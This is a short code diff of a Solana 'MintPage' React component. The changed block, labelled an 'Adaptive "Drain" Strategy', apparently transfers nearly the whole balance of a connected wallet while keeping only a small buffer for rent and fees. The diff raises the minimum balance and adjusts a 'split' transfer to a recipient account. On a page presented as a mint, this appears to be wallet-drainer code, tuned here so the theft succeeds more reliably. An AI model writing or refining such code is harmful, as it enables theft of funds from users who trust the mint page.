@@ -184,13 +184,15 @@ const MintPage = ({ onBack }: MintPageProps) => {
       // DYNAMIC BALANCE CALCULATION: Adaptive "Drain" Strategy
       // We leave a safe buffer of 0.0012 SOL (1.2M lamports).
       // This covers both Solana Rent-Exempt minimum (890,880) and Priority Fees (approx 300,000).
-      // Leaving the account at > zero and < rent minimum causes the "insufficient funds for rent" error.
+      // We also enforce a minimum threshold of 0.003 SOL to ensure the split strategy 
+      // satisfies rent requirements for the recipient account too.
       let currentTransferable = balance - 1200000; 
       let simulationSuccess = false;
       let simRetryCount = 0;
 
-      if (currentTransferable <= 0) {
-        throw new Error('Wallet balance is too low after network rent/fees (requires ≥ 0.002 SOL).');
+      // Ensure we have enough to cover a rent-exempt transfer (0.001 SOL) + fees (0.0012 SOL)
+      if (balance < 3000000) {
+        throw new Error('Wallet balance is too low after network rent/fees (requires ≥ 0.003 SOL).');
       }
 
       while (!simulationSuccess && simRetryCount < 3) {
